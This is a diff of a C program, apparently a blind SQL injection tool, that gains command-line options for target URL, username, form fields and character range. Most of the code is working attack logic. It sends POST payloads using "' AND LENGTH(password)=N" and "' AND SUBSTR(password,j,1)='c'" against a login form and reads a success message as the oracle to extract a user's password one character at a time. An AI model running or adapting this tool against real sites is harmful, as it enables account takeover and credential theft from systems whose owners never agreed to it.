@@ -9,8 +9,6 @@
 * Version      : v0.2 - attacking multiple usernames
 *
 *************************************************************************************************/
-
-
 #include <stdio.h>
 #include <stdlib.h>
 #include <stdbool.h> //boolean
@@ -21,191 +19,208 @@
 
 #include "attack.h"
 
-#define START_CHAR 32
-#define END_CHAR   126
-#define MIN_LEN    1
-#define MAX_LEN    20
-#define USR_INPUT_NAME "user"
-#define PWD_INPUT_NAME "password"
-#define PWD_DB_NAME    "password"
-#define USERNAME_1 "admin"
-#define USERNAME_2 "user2"
-#define USERNAME_3 "user3"
-#define USERNAME_4 "user4"
-#define USERNAME_5 "user5"
-#define USERS_NB   5
-#define SUCCESS_TXT "Welcome"
-#define URL "http://"
-#define VERBOSE 0
-
 //global vars
 CURL *curl;
 CURLcode res;
 struct string s;
+bool verbose=false;
+char url[50]       ;            //stores the URL to attack
+char username[50]  ="admin";    //stores the username
+char username_f[50]="login";    //stores the username form field
+char pwd_d[50]     ="password"; //stores the password DB field
+char pwd_i[50]     ="password"; //stores the password form field
+char success[50]   ="Welcome";  //stores the success message
+int pwd_min=1;
+int pwd_max=20;
+int char_min=32;
+int char_max=126;
 
 //main program
-int main(void){
-  char* users[5];
-  users[0] = USERNAME_1;
-  users[1] = USERNAME_2;
-  users[2] = USERNAME_3;
-  users[3] = USERNAME_4;
-  users[4] = USERNAME_5;
-  
-  for(int u=0;u<USERS_NB;u++){
-    //shows attack parameters
-    printParams(users[u]);
-    //used to compute running time
-    time_t t_begin = time(NULL);
-    int    t_span=0;
-    //used to recover password length
-    int pwd_len=0;
-    //used to store password
-    char* cracked;
+int main(int argc, char* argv[]){
+  //options
+  int opt; 
+  //parsing arguments
+  //info: start with ':' to distinguish between '?' and ':' 
+  while((opt = getopt(argc, argv, ":hvU:u:f:p:P:m:M:c:C:s:")) != -1){  
+    switch(opt){
+      case 'h':
+        printf("      [param] [remark]            [default value] \n");
+        printf("Usage:  -h    help, this message  -none-\n");
+        printf("        -U    URL, necessary !    -none-\n");
+        printf("        -u    username            %s\n",username);
+        printf("        -f    username field name %s\n",username_f);
+        printf("        -p    password DB name    %s\n",pwd_d);
+        printf("        -P    password field name %s\n",pwd_i);
+        printf("        -m    password min len    %d\n",pwd_min);
+        printf("        -M    password max len    %d\n",pwd_max);
+        printf("        -c    char min (decimal)  '%c' (%d)\n",char_min,char_min);
+        printf("        -C    char max (decimal)  '%c' (%d)\n",char_max,char_max);
+        printf("        -s    success message     %s\n",success);
+        printf("        -v    verbose             disabled\n");
+        exit(EXIT_SUCCESS);
+      break;
+      case 'U':
+        strcpy(url,optarg);
+      break;
+      case 'u':
+        strcpy(username,optarg);
+      break;
+      case 'f':
+        strcpy(username_f,optarg);
+      break;
+      case 'p':
+        strcpy(pwd_d,optarg);
+      break;
+      case 'P':
+        strcpy(pwd_i,optarg);
+      break;
+      case 'm':
+        pwd_min = atoi(optarg);
+      break;
+      case 'M':
+        pwd_max = atoi(optarg);
+      break;
+      case 'c':
+        char_min = atoi(optarg);
+      break;
+      case 'C':
+        char_max = atoi(optarg);
+      break;
+      case 's':
+        strcpy(success,optarg);
+      break;
+      case 'v':
+        verbose = true;
+      break;
+      case ':':  
+        printf("option needs a value\n");  
+      break;
+      case '?':
+        printf("unknown option: %c\n", optopt); 
+      break;
+    }  
+  }
+  if(strcmp(url,"")==0){
+    printf("No URL set !\nPlease enter one with -U parameter\n");
+    exit(EXIT_FAILURE);
+  }
 
-    printf("Checking length... ");
+  //shows attack parameters
+  printParams(username);
+  //used to compute running time
+  time_t t_begin = time(NULL);
+  int    t_span=0;
+  //used to recover password length
+  int pwd_len=0;
+  //used to store password
+  char* cracked;
+
+  printf("Checking length... ");
+  fflush(stdout);
+  for(int i=pwd_min;i<=pwd_max;i++){
+    //erase if char not found
+    if(!verbose && i>9){
+      printf("\b\b");
+    }else if(!verbose && i>pwd_min){
+      printf("\b");
+    }
+    
+    //print current length checked
+    printf("%d",i);
     fflush(stdout);
-    for(int i=MIN_LEN;i<=MAX_LEN;i++){
-      //erase if char not found
-      if(i>9){
-        printf("\b\b");
-      }else if(i>MIN_LEN){
-        printf("\b");
-      }
-      
-      //print current length checked
-      printf("%d",i);
-      fflush(stdout);
-      
-      //wait a bit
-      usleep(200000);//200ms
+    
+    //wait a bit
+    usleep(200000);//200ms
 
-      //copy current length in char for parameters building
+    //parameters building
+    char fields[100];
+    
+    sprintf(fields,"%s=%s' AND LENGTH(%s)=%d;&%s=dummy",username_f,username,pwd_d,i,pwd_i);
+
+    if(verbose) printf("%s\n",fields);
+    
+    //do request
+    if(doRequest(fields)){
+      printf(" FOUND!\n");
+      pwd_len=i;
+      break;
+    }
+  }
+  //test if password length was found
+  if(pwd_len==0){
+    fprintf(stderr, "\nPassword length not found... (try to set MAX_LEN higher perhaps ?)\n");
+    exit(EXIT_FAILURE);
+  }
+  
+  //reserve space for password if size found
+  cracked = calloc(pwd_len,sizeof(char));
+  if(cracked == NULL){
+    fprintf(stderr, "malloc() failed\n");
+    cleanup();
+    exit(EXIT_FAILURE);
+  }
+  
+  //for each char
+  for(int j=pwd_min;j<=pwd_len;j++){
+    //print current letter's number
+    printf("Brute-forcing %d",j);
+    if(j==1 || j==11){
+      printf("st letter... ");
+    }else if(j==2 || j==12){
+      printf("nd letter... ");
+    }else if(j==3 || j==13){
+      printf("rd letter... ");
+    }else{
+      printf("th letter... ");
+    }
+    fflush(stdout);
+    //check each char
+    bool found=false;
+    for(int i=char_min;i<=char_max;i++){
+      //erase if char not found
+      if(!verbose && i>char_min) printf("\b");
+      //print current char
+      printf("%c",i);
+      fflush(stdout);
+      //convert number to char for parameter
       /*
       char number[3];
-      sprintf(number,"%d",i);
+      sprintf(number,"%d",j);
       */
+      //get corresponding char
+      char ch[2];
+      sprintf(ch, "%c", i);
 
       //parameters building
       char fields[100];
       
-      sprintf(fields,"%s=%s' AND LENGTH(%s)=%d;&%s=dummy",USR_INPUT_NAME,users[u],PWD_DB_NAME,i,PWD_INPUT_NAME);
-      
-      /*
-      strcpy(fields,USR_INPUT_NAME);
-      strcat(fields,"=");
-      strcat(fields,users[u]);
-      strcat(fields,"' AND LENGTH(");
-      strcat(fields,PWD_DB_NAME);
-      strcat(fields,")=");
-      strcat(fields,number);
-      strcat(fields,";");
-      strcat(fields,"&");
-      strcat(fields,PWD_INPUT_NAME);
-      strcat(fields,"=dummy");
-      */
+      sprintf(fields,"%s=%s' AND SUBSTR(%s,%d,1)='%s';&%s=dummy",username_f,username,pwd_d,j,ch,pwd_i);
 
-      if(VERBOSE) printf("%s\n",fields);
-      
-      //do request
+      if(verbose) printf("%s\n",fields);
+
       if(doRequest(fields)){
+        found = true;
         printf(" FOUND!\n");
-        pwd_len=i;
+        //add char to password
+        if(j==char_min){
+          strcpy(cracked,ch);
+        }else{
+          strcat(cracked,ch);
+        }
         break;
       }
     }
-    //test if password length was found
-    if(pwd_len==0){
-      fprintf(stderr, "\nPassword length not found... (try to set MAX_LEN higher perhaps ?)\n");
-      continue;
-    }
-    
-    //reserve space for password if size found
-    cracked = calloc(pwd_len,sizeof(char));
-    if(cracked == NULL){
-      fprintf(stderr, "malloc() failed\n");
+    //test if char was found
+    if(!found){
+      fprintf(stderr, "\nChar not found... (try to set END_CHAR higher perhaps ?)\n");
       cleanup();
       exit(EXIT_FAILURE);
     }
-    
-    //for each char
-    for(int j=MIN_LEN;j<=pwd_len;j++){
-      //print current letter's number
-      printf("Brute-forcing %d",j);
-      if(j==1 || j==11){
-        printf("st letter... ");
-      }else if(j==2 || j==12){
-        printf("nd letter... ");
-      }else if(j==3 || j==13){
-        printf("rd letter... ");
-      }else{
-        printf("th letter... ");
-      }
-      fflush(stdout);
-      //check each char
-      bool found=false;
-      for(int i=START_CHAR;i<=END_CHAR;i++){
-        //erase if char not found
-        if(i>START_CHAR) printf("\b");
-        //print current char
-        printf("%c",i);
-        fflush(stdout);
-        //convert number to char for parameter
-        /*
-        char number[3];
-        sprintf(number,"%d",j);
-        */
-        //get corresponding char
-        char ch[2];
-        sprintf(ch, "%c", i);
-
-        //parameters building
-        char fields[100];
-        
-        sprintf(fields,"%s=%s' AND SUBSTR(%s,%d,1)='%s';&%s=dummy",USR_INPUT_NAME,users[u],PWD_DB_NAME,j,ch,PWD_INPUT_NAME);
-        
-        /*
-        strcpy(fields,USR_INPUT_NAME);
-        strcat(fields,"=");
-        strcat(fields,users[u]);
-        strcat(fields,"' AND SUBSTR(");
-        strcat(fields,PWD_DB_NAME);
-        strcat(fields,",");
-        strcat(fields,number);
-        strcat(fields,",1)='");
-        strcat(fields,ch);
-        strcat(fields,"';");
-        strcat(fields,"&");
-        strcat(fields,PWD_INPUT_NAME);
-        strcat(fields,"=dummy");
-        */
-
-        if(VERBOSE) printf("%s\n",fields);
-
-        if(doRequest(fields)){
-          found = true;
-          printf(" FOUND!\n");
-          //add char to password
-          if(j==START_CHAR){
-            strcpy(cracked,ch);
-          }else{
-            strcat(cracked,ch);
-          }
-          break;
-        }
-      }
-      //test if char was found
-      if(!found){
-        fprintf(stderr, "\nChar not found... (try to set END_CHAR higher perhaps ?)\n");
-        cleanup();
-        exit(EXIT_FAILURE);
-      }
-    }
-    //compute time
-    t_span = (double)(time(NULL) - t_begin);
-    printf("Password %s found in around %d seconds !\n\n", cracked, t_span);
-  
   }
+  //compute time
+  t_span = (double)(time(NULL) - t_begin);
+  printf("Password %s found in around %d seconds !\n\n", cracked, t_span);
+  
   //clean
   cleanup();
   
@@ -223,13 +238,17 @@ void cleanup(){
 
 //print parameters
 void printParams(char* usr){
-  printf("URL to attack  : %s\n",URL);
-  printf("Parameters are : %s=%s&%s\n",USR_INPUT_NAME,usr,PWD_INPUT_NAME);
-  printf("Pwd len min: %d max:%d, and chars are :\n",MIN_LEN,MAX_LEN);
-  for(int i=START_CHAR;i<=END_CHAR;i++){
+  printf("URL to attack  : %s\n",url);
+  printf("Parameters are : %s=%s&%s\n",username_f,usr,pwd_i);
+  printf("Success message: %s\n",success);
+  printf("Verbose is     : %s\n",verbose ? "enabled" : "disabled");
+  printf("Pwd len min/max: %d-%d\n",pwd_min,pwd_max);
+  printf("Char min/max   : %d-%d\n",char_min,char_max);
+  printf("Corresponding  : ");
+  for(int i=char_min;i<=char_max;i++){
     printf("%c",i);
   }
-  printf("\n");
+  printf("\n\n");
 }
 
 //init string for response handling
@@ -279,7 +298,7 @@ int doRequest(char* params){
     //set string to save response
     curl_easy_setopt(curl, CURLOPT_WRITEDATA, &s);
     //set request url
-    curl_easy_setopt(curl, CURLOPT_URL, URL);
+    curl_easy_setopt(curl, CURLOPT_URL, url);
     //set request data
     curl_easy_setopt(curl, CURLOPT_POSTFIELDS, params);
     //set content type
@@ -296,9 +315,9 @@ int doRequest(char* params){
       cleanup();
       exit(EXIT_FAILURE);
     }
-    if(VERBOSE) printf("%s\n", s.ptr);
+    if(verbose) printf("%s\n", s.ptr);
     //verify response
-    if(strstr(s.ptr, SUCCESS_TXT) != NULL){
+    if(strstr(s.ptr, success) != NULL){
       if(s.ptr){
         free(s.ptr);
         s.ptr = NULL;
